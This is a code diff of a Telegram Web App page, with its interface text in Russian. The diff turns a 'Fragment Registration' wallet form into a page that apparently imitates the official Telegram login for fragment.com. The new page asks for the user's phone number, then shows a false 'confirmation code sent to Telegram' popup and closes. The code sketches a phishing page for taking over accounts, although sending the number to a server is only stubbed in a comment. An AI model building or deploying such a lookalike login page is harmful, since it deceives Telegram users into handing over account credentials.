@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Fragment Registration</title>
+    <title>Fragment Login</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -14,8 +14,8 @@
         
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: #333;
+            background: white;
+            color: #000;
             min-height: 100vh;
             padding: 20px;
         }
@@ -23,204 +23,265 @@
         .container {
             max-width: 400px;
             margin: 0 auto;
-            background: white;
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
         }
         
         .header {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 40px;
+            padding-top: 40px;
         }
         
-        .logo {
-            font-size: 48px;
-            margin-bottom: 10px;
+        .telegram-icon {
+            width: 80px;
+            height: 80px;
+            background: #0088cc;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: white;
         }
         
         h1 {
-            color: #333;
+            font-weight: 700;
+            font-size: 20px;
             margin-bottom: 10px;
-            font-size: 24px;
+            color: #000;
         }
         
         .subtitle {
             color: #666;
             font-size: 16px;
-            line-height: 1.5;
+            line-height: 1.4;
+            margin-bottom: 30px;
+        }
+        
+        .phone-label {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 8px;
         }
         
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
         
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #333;
+        .country-selector {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
         }
         
-        input, select {
-            width: 100%;
+        .country-flag {
+            width: 30px;
+            font-size: 18px;
+        }
+        
+        select {
+            flex: 1;
             padding: 12px 15px;
-            border: 2px solid #e1e5e9;
+            border: 1px solid #ddd;
             border-radius: 10px;
             font-size: 16px;
-            transition: border-color 0.3s;
+            background: white;
         }
         
-        input:focus, select:focus {
+        .phone-input {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        .country-code {
+            padding: 12px 15px;
+            background: #f8f9fa;
+            border-right: 1px solid #ddd;
+            font-size: 16px;
+            color: #000;
+        }
+        
+        input[type="tel"] {
+            flex: 1;
+            padding: 12px 15px;
+            border: none;
             outline: none;
-            border-color: #667eea;
+            font-size: 16px;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 30px;
         }
         
         .btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
+            flex: 1;
             padding: 15px;
+            border: none;
             border-radius: 10px;
-            width: 100%;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            margin: 10px 0;
-            transition: transform 0.2s;
+            transition: background-color 0.2s;
         }
         
-        .btn:hover {
-            transform: translateY(-2px);
-        }
-        
-        .btn-secondary {
-            background: #6c757d;
-        }
-        
-        .success-message {
-            background: #d4edda;
-            color: #155724;
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            margin: 20px 0;
-            display: none;
-        }
-        
-        .user-info {
+        .btn-cancel {
             background: #f8f9fa;
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            text-align: center;
+            color: #666;
+        }
+        
+        .btn-next {
+            background: #0088cc;
+            color: white;
+        }
+        
+        .btn-cancel:hover {
+            background: #e9ecef;
+        }
+        
+        .btn-next:hover {
+            background: #0077bb;
+        }
+        
+        .info-text {
+            color: #666;
             font-size: 14px;
+            text-align: center;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <div class="logo">🎯</div>
-            <h1>Fragment Registration</h1>
-            <p class="subtitle">Зарегистрируйтесь в системе Fragment для вывода звезд</p>
+            <div class="telegram-icon">✈️</div>
+            <h1>Войдите, чтобы использовать аккаунт Telegram</h1>
+            <p class="subtitle">для fragment.com и Fragment Auction Alerts.</p>
         </div>
         
-        <div class="user-info" id="userInfo">
-            Загрузка данных...
-        </div>
-        
-        <form id="registrationForm">
-            <div class="form-group">
-                <label for="username">Имя пользователя:</label>
-                <input type="text" id="username" placeholder="Введите ваш username" required>
-            </div>
+        <div class="form-group">
+            <div class="phone-label">Введите свой <span style="color: #666;">номер телефона</span> в международном формате.</div>
+            <p class="info-text">Подтверждение будет отправлено в Telegram.</p>
             
-            <div class="form-group">
-                <label for="wallet">Wallet адрес:</label>
-                <input type="text" id="wallet" placeholder="Введите адрес кошелька" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="currency">Валюта:</label>
-                <select id="currency" required>
-                    <option value="">Выберите валюту</option>
-                    <option value="TON">TON</option>
-                    <option value="USDT">USDT</option>
-                    <option value="BTC">BTC</option>
+            <div class="country-selector">
+                <div class="country-flag" id="countryFlag">🇷🇺</div>
+                <select id="countrySelect" onchange="updateCountryCode()">
+                    <option value="+7">Россия (+7)</option>
+                    <option value="+1">США (+1)</option>
+                    <option value="+44">Великобритания (+44)</option>
+                    <option value="+49">Германия (+49)</option>
+                    <option value="+33">Франция (+33)</option>
+                    <option value="+39">Италия (+39)</option>
+                    <option value="+34">Испания (+34)</option>
+                    <option value="+86">Китай (+86)</option>
+                    <option value="+81">Япония (+81)</option>
+                    <option value="+82">Корея (+82)</option>
+                    <option value="+91">Индия (+91)</option>
+                    <option value="+55">Бразилия (+55)</option>
+                    <option value="+61">Австралия (+61)</option>
+                    <option value="+64">Новая Зеландия (+64)</option>
+                    <option value="+971">ОАЭ (+971)</option>
+                    <option value="+966">Саудовская Аравия (+966)</option>
+                    <option value="+380">Украина (+380)</option>
+                    <option value="+375">Беларусь (+375)</option>
+                    <option value="+77">Казахстан (+77)</option>
+                    <option value="+374">Армения (+374)</option>
+                    <option value="+994">Азербайджан (+994)</option>
+                    <option value="+995">Грузия (+995)</option>
                 </select>
             </div>
             
-            <button type="submit" class="btn">📝 Зарегистрироваться</button>
-        </form>
-        
-        <div class="success-message" id="successMessage">
-            ✅ Регистрация успешно завершена! Теперь вы можете выводить звезды.
+            <div class="phone-input">
+                <div class="country-code" id="countryCode">+7</div>
+                <input type="tel" id="phoneNumber" placeholder="900 123 45 67" pattern="[0-9]*" inputmode="numeric">
+            </div>
         </div>
         
-        <button class="btn btn-secondary" onclick="closeApp()">❌ Закрыть</button>
+        <div class="button-group">
+            <button class="btn btn-cancel" onclick="closeApp()">Отмена</button>
+            <button class="btn btn-next" onclick="sendCode()">Далее</button>
+        </div>
     </div>
 
     <script>
         // Инициализация Telegram Web App
         let tg = window.Telegram.WebApp;
-        
-        // Расширяем на весь экран
         tg.expand();
         
-        // Показываем основную кнопку
-        tg.MainButton.setText("Fragment Registration").show();
+        // Флаги стран для отображения
+        const countryFlags = {
+            '+7': '🇷🇺',
+            '+1': '🇺🇸', 
+            '+44': '🇬🇧',
+            '+49': '🇩🇪',
+            '+33': '🇫🇷',
+            '+39': '🇮🇹',
+            '+34': '🇪🇸',
+            '+86': '🇨🇳',
+            '+81': '🇯🇵',
+            '+82': '🇰🇷',
+            '+91': '🇮🇳',
+            '+55': '🇧🇷',
+            '+61': '🇦🇺',
+            '+64': '🇳🇿',
+            '+971': '🇦🇪',
+            '+966': '🇸🇦',
+            '+380': '🇺🇦',
+            '+375': '🇧🇾',
+            '+77': '🇰🇿',
+            '+374': '🇦🇲',
+            '+994': '🇦🇿',
+            '+995': '🇬🇪'
+        };
         
-        // Получаем данные пользователя из Telegram
-        let user = tg.initDataUnsafe.user;
-        
-        if (user) {
-            // Показываем информацию о пользователе
-            let userInfo = document.getElementById('userInfo');
-            userInfo.innerHTML = `
-                👤 <strong>${user.first_name || 'Пользователь'}</strong>
-                ${user.username ? `<br>@${user.username}` : ''}
-                <br>🆔 ID: ${user.id}
-            `;
-            
-            // Заполняем username автоматически
-            if (user.username) {
-                document.getElementById('username').value = user.username;
-            }
+        function updateCountryCode() {
+            const select = document.getElementById('countrySelect');
+            const code = select.value;
+            document.getElementById('countryCode').textContent = code;
+            document.getElementById('countryFlag').textContent = countryFlags[code] || '🇺🇳';
         }
         
-        // Обработка формы регистрации
-        document.getElementById('registrationForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        function sendCode() {
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const countryCode = document.getElementById('countryCode').textContent;
+            const fullNumber = countryCode + phoneNumber.replace(/\s/g, '');
             
-            // Здесь можно отправить данные на сервер
-            // Пока просто показываем сообщение об успехе
-            document.getElementById('successMessage').style.display = 'block';
-            document.getElementById('registrationForm').style.display = 'none';
+            if (!phoneNumber) {
+                alert('Пожалуйста, введите номер телефона');
+                return;
+            }
             
-            // Можно отправить данные обратно в бот
-            let formData = {
-                username: document.getElementById('username').value,
-                wallet: document.getElementById('wallet').value,
-                currency: document.getElementById('currency').value,
-                telegramId: user ? user.id : null
-            };
+            // Здесь будет отправка номера на сервер
+            console.log('Phone number:', fullNumber);
             
-            console.log('Registration data:', formData);
+            // Показываем сообщение об успехе
+            tg.showPopup({
+                title: "Код отправлен!",
+                message: "Код подтверждения отправлен в Telegram.",
+                buttons: [{ type: "ok" }]
+            });
             
-            // Закрываем приложение через 3 секунды
+            // Закрываем приложение через 2 секунды
             setTimeout(() => {
                 tg.close();
-            }, 3000);
-        });
+            }, 2000);
+        }
         
         function closeApp() {
             tg.close();
         }
         
-        // Обработчик основной кнопки Telegram
-        tg.MainButton.onClick(function() {
-            document.getElementById('registrationForm').dispatchEvent(new Event('submit'));
+        // Автоматический формат номера
+        document.getElementById('phoneNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 0) {
+                value = value.match(/.{1,3}/g).join(' ');
+            }
+            e.target.value = value;
         });
     </script>
 </body>
